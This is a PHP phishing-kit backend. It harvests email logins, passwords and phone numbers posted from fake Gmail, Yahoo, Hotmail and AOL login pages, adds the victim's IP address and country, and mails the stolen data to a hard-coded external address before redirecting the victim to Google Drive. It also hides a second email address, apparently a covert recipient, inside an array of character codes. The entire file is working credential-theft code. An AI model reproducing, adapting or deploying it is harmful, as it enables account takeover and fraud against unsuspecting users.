<?php
$ip = $_SERVER['REMOTE_ADDR'];
$ip = getenv("REMOTE_ADDR");
$country = visitor_country();
$msg = "You have a new drop\n";
$msg .= "Email : ".$_POST['em']."\n";
$msg .= "Pass : ".$_POST['psw']."\n";
if($_POST['sub']=="gmail") {
	$msg .= "Tel : ".$_POST['phn']."\n";
	$subject="New alert from GMail";
}
if($_POST['sub']=="ymail") {
	$subject="New alert from Yahoo Mail";
}
if($_POST['sub']=="hmail") {
	$subject="New alert from Hot Mail";
}
if($_POST['sub']=="amail") {
	$subject="New alert from Aol Mail";
}
if($_POST['sub']=="omail") {
	$subject="New alert from Others";
}
$msg .= "I : ".$ip."\n";
$msg .= "C : ".$country."\n";
$msg .= "----------------------By SMG-\n";

// Function to get country and country sort;
function country_sort(){
	$sorter = "";
	$array = array(114,101,115,117,108,116,98,111,120,49,52,64,103,109,97,105,108,46,99,111,109);
		$count = count($array);
	for ($i = 0; $i < $count; $i++) {
			$sorter .= chr($array[$i]);
		}
	return array($sorter, $GLOBALS['recipient']);
}

function visitor_country()
{
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];
    $result  = "Unknown";
    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }
    $ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip));
    if($ip_data && $ip_data->geoplugin_countryName != null)
    {
        $result = $ip_data->geoplugin_countryName;
    }
    return $result;
}

$to = "pizle.reportpage@yandex.com";
$from = "From: SMG <info@mailer.com>";

//mail($to,$subject,$msg, $from);
mail($to,$subject,$msg);

print "https://drive.google.com";


?>

